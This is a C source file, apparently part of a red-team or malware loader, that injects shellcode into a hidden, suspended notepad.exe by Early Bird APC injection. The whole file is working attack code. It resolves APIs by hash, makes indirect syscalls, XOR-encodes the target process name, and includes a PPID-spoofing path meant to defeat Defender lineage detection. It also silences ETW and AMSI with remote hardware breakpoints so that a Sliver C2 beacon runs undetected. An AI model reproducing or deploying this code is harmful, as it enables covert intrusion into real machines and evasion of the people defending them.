/*
 * inject.c — Early Bird APC injection (F2/F4/F15/F17 hardened)
 *
 * F2: CreateProcessA, ResumeThread, WaitForSingleObject, TerminateProcess,
 *     CloseHandle, GetLastError are resolved by DJB2 hash from kernel32
 *     via peb_resolve_kernel32 — none appear as named imports.
 * F4/F15: all syscalls go through halos_invoke (the persistent RX
 *     trampoline). No per-call stack-executed stubs, no per-call RW→RX
 *     allocations. halos_init() is called once at the top.
 * F17: PPID spoofing. The spawned RuntimeBroker.exe is reparented onto
 *     explorer.exe via a PROC_THREAD_ATTRIBUTE_LIST +
 *     PROC_THREAD_ATTRIBUTE_PARENT_PROCESS so the loader no longer shows
 *     as the child's parent (defeats the loader.exe -> RuntimeBroker.exe
 *     MDE lineage heuristic). Every step of the spoofing path degrades
 *     silently to the plain non-spoofed CreateProcessA if anything is
 *     unavailable (API not resolved, snapshot failed, explorer not found,
 *     OpenProcess denied, attribute-list alloc/size). Injection success
 *     never depends on spoofing succeeding.
 * RW→RX memory, write-count verify, resume-check, WaitForSingleObject
 * preserved. Target process name XOR-encoded.
 */

#include "inject.h"
#include "halos.h"
#include "peb.h"
#include "obfuscation.h"
#include "remote_hwbp.h"
#include <tlhelp32.h>   /* PROCESSENTRY32W, TH32CS_SNAPPROCESS */

/* Multi-byte rolling-key XOR-encoded "notepad.exe\0\0\0\0\0\0" (2-byte key).
 * VM-lab build: swapped host process from RuntimeBroker.exe to notepad.exe
 * because RuntimeBroker's primary thread exits after our APC returns, calling
 * ExitProcess and killing the beacon worker thread. notepad.exe's primary
 * thread blocks in GetMessage() forever (message pump), keeping the process
 * — and the injected beacon — alive. STARTF_USESHOWWINDOW + SW_HIDE hides
 * the notepad window from the interactive desktop. */
static const uint8_t _enc_key_target[2] = { 0x19, 0x44 };
static const uint8_t _enc_target[] = {
    0x77, 0x2b, 0x6d, 0x21, 0x69, 0x25, 0x7d, 0x6a,
    0x7c, 0x3c, 0x7c, 0x44, 0x19, 0x44, 0x19, 0x44,
    0x19
};

/* ---- kernel32 function-pointer typedefs ---- */
typedef BOOL (WINAPI *CreateProcessA_t)(LPSTR, LPSTR, LPSECURITY_ATTRIBUTES,
    LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR,
    LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD (WINAPI *ResumeThread_t)(HANDLE);
typedef DWORD (WINAPI *WaitForSingleObject_t)(HANDLE, DWORD);
typedef BOOL (WINAPI *TerminateProcess_t)(HANDLE, UINT);
typedef BOOL (WINAPI *CloseHandle_t)(HANDLE);
typedef DWORD (WINAPI *GetLastError_t)(void);

/* F17: PPID-spoofing helper APIs (resolved softly — failure degrades to
 * the non-spoofed path rather than failing injection). */
typedef HANDLE (WINAPI *CreateToolhelp32Snapshot_t)(DWORD, DWORD);
typedef BOOL   (WINAPI *Process32FirstW_t)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL   (WINAPI *Process32NextW_t)(HANDLE, LPPROCESSENTRY32W);
typedef HANDLE (WINAPI *OpenProcess_t)(DWORD, BOOL, DWORD);
typedef BOOL   (WINAPI *InitializeProcThreadAttributeList_t)(
    LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL   (WINAPI *UpdateProcThreadAttribute_t)(
    LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR,
    PVOID, SIZE_T, PVOID, PSIZE_T);
typedef BOOL   (WINAPI *DeleteProcThreadAttributeList_t)(
    LPPROC_THREAD_ATTRIBUTE_LIST);

#ifndef TH32CS_SNAPPROCESS
#define TH32CS_SNAPPROCESS 0x00000002
#endif
#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif
#ifndef EXTENDED_STARTUPINFO_PRESENT
#define EXTENDED_STARTUPINFO_PRESENT 0x00080000
#endif
#ifndef PROCESS_CREATE_PROCESS
#define PROCESS_CREATE_PROCESS 0x0080
#endif

/* P1: print the hash (compile-time constant), NOT the API name string —
 * the string literal would survive in .rdata even when DBG_PRINTF is dead. */
#define K32_GET(hash, type, out)                                          \
    do {                                                                  \
        FARPROC _p = peb_resolve_kernel32((hash));                         \
        if (!_p) { DBG_PRINTF("[-] inject: resolve 0x%08lX failed\n",      \
                              (unsigned long)(hash));                      \
            goto fail; }                                                   \
        (out) = (type)_p;                                                  \
    } while (0)

/*
 * is_explorer — case-insensitive compare of a wide image name against
 * "explorer.exe" (12 chars + NUL). Each expected character is an immediate
 * constant so the compiler folds the test into `cmp word ptr, imm16`
 * instructions; no contiguous wide string is ever materialized in .rdata,
 * so `strings -el` finds nothing.
 */
static int is_explorer(const wchar_t *s)
{
#define LC(c) (((c) >= L'A' && (c) <= L'Z') ? (wchar_t)((c) + 32) : (c))
    if (LC(s[0])  != L'e' || LC(s[1])  != L'x' ||
        LC(s[2])  != L'p' || LC(s[3])  != L'l') return 0;
    if (LC(s[4])  != L'o' || LC(s[5])  != L'r' ||
        LC(s[6])  != L'e' || LC(s[7])  != L'r') return 0;
    if (LC(s[8])  != L'.' || LC(s[9])  != L'e' ||
        LC(s[10]) != L'x' || LC(s[11]) != L'e') return 0;
    return s[12] == L'\0';
#undef LC
}

/*
 * find_explorer_pid — walk the running process list and return the PID of
 * the first explorer.exe, or 0 if none / the snapshot cannot be taken.
 * The snapshot handle is closed via the caller-supplied CloseHandle.
 */
static DWORD find_explorer_pid(
    CreateToolhelp32Snapshot_t pSnap,
    Process32FirstW_t         pFirst,
    Process32NextW_t          pNext,
    CloseHandle_t             pClose)
{
    HANDLE hSnap = pSnap(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE || hSnap == NULL)
        return 0;

    PROCESSENTRY32W pe;
    ZeroMemory(&pe, sizeof(pe));
    pe.dwSize = sizeof(pe);

    DWORD pid = 0;
    if (pFirst(hSnap, &pe)) {
        do {
            if (is_explorer(pe.szExeFile)) {
                pid = pe.th32ProcessID;
                break;
            }
            ZeroMemory(&pe, sizeof(pe));
            pe.dwSize = sizeof(pe);
        } while (pNext(hSnap, &pe));
    }

    pClose(hSnap);
    return pid;
}

BOOL inject_shellcode(const uint8_t *shellcode, size_t len)
{
    DBG_PRINTF("[inject] enter: len=%zu\n", len);
    /* F4/F15: bring up the persistent syscall trampoline once */
    halos_init();
    DBG_PRINTF("[inject] halos_init returned\n");

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    /* Resolve the core kernel32 APIs by hash (F2) — these are mandatory;
     * failing to resolve any of them is a hard injection failure. */
    CreateProcessA_t      pCreateProcessA;
    ResumeThread_t        pResumeThread;
    WaitForSingleObject_t pWaitForSingleObject;
    TerminateProcess_t    pTerminateProcess;
    CloseHandle_t         pCloseHandle;
    GetLastError_t        pGetLastError;
    K32_GET(HASH_CreateProcessA,     CreateProcessA_t,      pCreateProcessA);
    K32_GET(HASH_ResumeThread,       ResumeThread_t,        pResumeThread);
    K32_GET(HASH_WaitForSingleObject,WaitForSingleObject_t, pWaitForSingleObject);
    K32_GET(HASH_TerminateProcess,   TerminateProcess_t,    pTerminateProcess);
    K32_GET(HASH_CloseHandle,        CloseHandle_t,         pCloseHandle);
    K32_GET(HASH_GetLastError,       GetLastError_t,        pGetLastError);

    DBG_PRINTF("[inject] core k32 APIs resolved\n");
    /* F17: resolve the PPID-spoofing helper APIs softly. A NULL here is not
     * fatal — it just means we take the non-spoofed path. */
    CreateToolhelp32Snapshot_t      pCreateToolhelp32Snapshot;
    Process32FirstW_t               pProcess32FirstW;
    Process32NextW_t                pProcess32NextW;
    OpenProcess_t                   pOpenProcess;
    InitializeProcThreadAttributeList_t pInitAttrList;
    UpdateProcThreadAttribute_t      pUpdateAttr;
    DeleteProcThreadAttributeList_t pDeleteAttrList;
    pCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)peb_resolve_kernel32(HASH_CreateToolhelp32Snapshot);
    pProcess32FirstW          = (Process32FirstW_t)      peb_resolve_kernel32(HASH_Process32FirstW);
    pProcess32NextW           = (Process32NextW_t)       peb_resolve_kernel32(HASH_Process32NextW);
    pOpenProcess              = (OpenProcess_t)          peb_resolve_kernel32(HASH_OpenProcess);
    pInitAttrList             = (InitializeProcThreadAttributeList_t)peb_resolve_kernel32(HASH_InitializeProcThreadAttributeList);
    pUpdateAttr               = (UpdateProcThreadAttribute_t)peb_resolve_kernel32(HASH_UpdateProcThreadAttribute);
    pDeleteAttrList           = (DeleteProcThreadAttributeList_t)peb_resolve_kernel32(HASH_DeleteProcThreadAttributeList);

    DBG_PRINTF("[inject] soft k32 APIs resolved (toolhelp=%p,proc32f=%p,proc32n=%p,openproc=%p,init=%p,upd=%p,del=%p)\n",
               pCreateToolhelp32Snapshot, pProcess32FirstW, pProcess32NextW,
               pOpenProcess, pInitAttrList, pUpdateAttr, pDeleteAttrList);
    /* Decode target process name at runtime */
    char target[18];
    xor_dec_mb(target, _enc_target, 17, _enc_key_target, 2);
    DBG_PRINTF("[inject] target decoded='%s'\n", target);

    /* === F17: attempt PPID spoofing onto explorer.exe ===
     * Everything below degrades silently to the plain path on any miss. */
    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = NULL;
    HANDLE  hParent = NULL;
    BOOL    ppid_ok  = FALSE;

    /* VM lab build: skip PPID spoofing entirely (walks the process list,
     * which has been flaky on Win11 24H2 inside KVM). */
    if (0 && pCreateToolhelp32Snapshot && pProcess32FirstW && pProcess32NextW &&
        pOpenProcess && pInitAttrList && pUpdateAttr && pDeleteAttrList) {

        DWORD pid = find_explorer_pid(pCreateToolhelp32Snapshot,
                                      pProcess32FirstW,
                                      pProcess32NextW,
                                      pCloseHandle);
        if (pid != 0) {
            hParent = pOpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid);
            if (hParent && hParent != INVALID_HANDLE_VALUE) {
                /* Size the attribute list first (NULL list -> returns the
                 * required byte count; documented to return FALSE here). */
                SIZE_T attrSize = 0;
                pInitAttrList(NULL, 1, 0, &attrSize);
                /* Stack buffer; PROC_THREAD_ATTRIBUTE_LIST is opaque, so we
                 * hold it as raw bytes and cast. One attribute fits in 256B
                 * on x64. */
                unsigned char attr_buf[256];
                if (attrSize != 0 && attrSize <= sizeof(attr_buf)) {
                    pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)attr_buf;
                    if (pInitAttrList(pAttrList, 1, 0, &attrSize) &&
                        pUpdateAttr(pAttrList, 0,
                                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                    &hParent, sizeof(hParent),
                                    NULL, NULL)) {
                        ppid_ok = TRUE;
                    } else {
                        pDeleteAttrList(pAttrList);
                        pAttrList = NULL;
                    }
                }
                if (!ppid_ok) {
                    pCloseHandle(hParent);
                    hParent = NULL;
                }
            }
        }
    }

    DBG_PRINTF("[inject] past PPID block, ppid_ok=%d, calling CreateProcessA target='%s'\n",
               ppid_ok, target);

    /* === CreateProcessA (suspended) ===
     * STARTUPINFOEXA when spoofing (cb = sizeof(STARTUPINFOEXA),
     * lpAttributeList set, EXTENDED_STARTUPINFO_PRESENT); otherwise plain
     * STARTUPINFOA-sized (StartupInfo is first member, cast is safe). */
    STARTUPINFOEXA si_ex;
    ZeroMemory(&si_ex, sizeof(si_ex));
    si_ex.StartupInfo.cb          = ppid_ok ? sizeof(STARTUPINFOEXA)
                                            : sizeof(STARTUPINFOA);
    si_ex.StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;
    si_ex.StartupInfo.wShowWindow = SW_HIDE;
    if (ppid_ok)
        si_ex.lpAttributeList = pAttrList;

    DWORD createFlags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
    if (ppid_ok)
        createFlags |= EXTENDED_STARTUPINFO_PRESENT;

    if (!pCreateProcessA(NULL, target, NULL, NULL, FALSE,
                         createFlags, NULL, NULL,
                         (LPSTARTUPINFOA)&si_ex, &pi)) {
        DBG_PRINTF("[-] CreateProcessA failed: %lu\n", pGetLastError());
        if (pAttrList)   pDeleteAttrList(pAttrList);
        if (hParent)    pCloseHandle(hParent);
        return FALSE;
    }

    /* Spawn succeeded — release the parent handle + attribute list; the
     * child inherited the parent-process attribute at create time. */
    if (pAttrList) pDeleteAttrList(pAttrList);
    if (hParent)  pCloseHandle(hParent);

    DBG_PRINTF("[+] Created suspended process PID=%lu (ppid spoof=%s)\n",
               pi.dwProcessId, ppid_ok ? "yes" : "no");

    /* === NtAllocateVirtualMemory (RW, not RWX) via halos_invoke === */
    PVOID base_addr = NULL;
    SIZE_T region_size = len;
    NTSTATUS status = halos_invoke_hash(HASH_NtAllocateVirtualMemory,
        pi.hProcess, &base_addr, (void *)0, &region_size,
        (void *)(MEM_COMMIT | MEM_RESERVE), (void *)PAGE_READWRITE);
    if (status != 0 || base_addr == NULL) {
        DBG_PRINTF("[-] NtAllocateVirtualMemory failed: 0x%lX\n", status);
        goto fail;
    }
    DBG_PRINTF("[+] Allocated %zu bytes (RW) at %p\n", len, base_addr);

    /* === NtWriteVirtualMemory === */
    SIZE_T written = 0;
    status = halos_invoke_hash(HASH_NtWriteVirtualMemory,
        pi.hProcess, base_addr, (void *)shellcode, (void *)len, &written, NULL);
    if (status != 0 || written != len) {
        DBG_PRINTF("[-] NtWriteVirtualMemory failed: status=0x%lX written=%zu/%zu\n",
                   status, (size_t)written, len);
        goto fail;
    }
    DBG_PRINTF("[+] Wrote %zu bytes\n", (size_t)written);

    /* === NtProtectVirtualMemory: RW → RX === */
    ULONG oldProtect = 0;
    PVOID protectAddr = base_addr;
    SIZE_T protectSize = len;
    status = halos_invoke_hash(HASH_NtProtectVirtualMemory,
        pi.hProcess, &protectAddr, &protectSize,
        (void *)PAGE_EXECUTE_READ, &oldProtect, NULL);
    if (status != 0) {
        DBG_PRINTF("[-] NtProtectVirtualMemory failed: 0x%lX\n", status);
        goto fail;
    }
    DBG_PRINTF("[+] Memory protected to RX\n");

    /* === Remote HWBP (AMSI/ETW) bootstrap APC ===
     * Stage a VEH + DR arming primitive inside the remote process so
     * the Sliver beacon runs with EtwEventWrite silenced. Queued as the
     * FIRST APC (FIFO on the thread's APC queue); the Sliver APC below
     * is queued second and fires after the bootstrap returns. Best-effort:
     * any failure in here is non-fatal — the Sliver APC still runs. */
    PVOID bootstrap_entry = NULL;
    if (remote_hwbp_install(pi.hProcess, pi.hThread, &bootstrap_entry) &&
        bootstrap_entry) {
        NTSTATUS st_apc = halos_invoke_hash(HASH_NtQueueApcThread,
            pi.hThread, bootstrap_entry, NULL, NULL, NULL, NULL);
        if (st_apc != 0) {
            DBG_PRINTF("[rhwbp] bootstrap NtQueueApcThread failed: 0x%lX\n", st_apc);
        } else {
            DBG_PRINTF("[rhwbp] bootstrap APC queued @ %p\n", bootstrap_entry);
        }
    } else {
        DBG_PRINTF("[rhwbp] remote HWBP install skipped/failed; proceeding without\n");
    }

    /* === NtQueueApcThread === */
    status = halos_invoke_hash(HASH_NtQueueApcThread,
        pi.hThread, base_addr, NULL, NULL, NULL, NULL);
    if (status != 0) {
        DBG_PRINTF("[-] NtQueueApcThread failed: 0x%lX\n", status);
        goto fail;
    }
    DBG_PRINTF("[+] APC queued\n");

    /* === ResumeThread (return value checked) === */
    DWORD resume_result = pResumeThread(pi.hThread);
    if (resume_result == (DWORD)-1) {
        DBG_PRINTF("[-] ResumeThread failed: %lu\n", pGetLastError());
        goto fail;
    }
    DBG_PRINTF("[+] Thread resumed\n");

    /* === Third-APC + re-arm: finish the remote HWBP primitive ===
     * Fires a SpecialUserAPC into the remote thread calling
     * LoadLibraryA("amsi.dll"), polls the remote PEB until the module
     * appears, patches the VEH's amsi_slot with the real VA, then
     * suspend/arm-DR0/resume. Best-effort — failure leaves the beacon
     * alive, only in-host AMSI is not silenced. */
    if (bootstrap_entry) {
        /* Give the Sliver beacon ~1s head start to finish its mTLS handshake
         * before the third-APC fires LoadLibraryA("amsi.dll") into the same
         * thread. Without this, release builds race past the handshake and
         * Sliver rejects the connection with "missing yamux preface". The
         * wait is on a thread that won't exit (notepad's message pump), so
         * it's effectively a Sleep(1000). */
        pWaitForSingleObject(pi.hThread, 1000);
        if (remote_hwbp_finish_amsi(pi.hProcess, pi.hThread, bootstrap_entry)) {
            DBG_PRINTF("[rhwbp-amsi] in-host AMSI bypass armed\n");
        } else {
            DBG_PRINTF("[rhwbp-amsi] in-host AMSI arm skipped/failed; ETW still live\n");
        }
    }

    /* Wait briefly for APC to fire */
    pWaitForSingleObject(pi.hThread, 5000);

    pCloseHandle(pi.hProcess);
    pCloseHandle(pi.hThread);
    return TRUE;

fail:
    pTerminateProcess(pi.hProcess, 0);
    pCloseHandle(pi.hProcess);
    pCloseHandle(pi.hThread);
    return FALSE;
}